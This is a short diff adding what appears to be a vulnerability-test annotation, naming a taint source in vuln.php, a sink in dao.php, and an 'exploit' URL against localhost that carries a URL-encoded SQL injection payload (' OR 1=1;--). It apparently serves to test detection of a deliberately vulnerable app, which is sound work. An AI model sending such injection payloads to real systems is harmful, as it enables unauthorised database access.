@@ -1,0 +1,5 @@
+source vuln.php:6
+sink dao.php:43
+
+exploit http://localhost:9000/vuln.php?val=1337%27%20OR%201=1;--
+
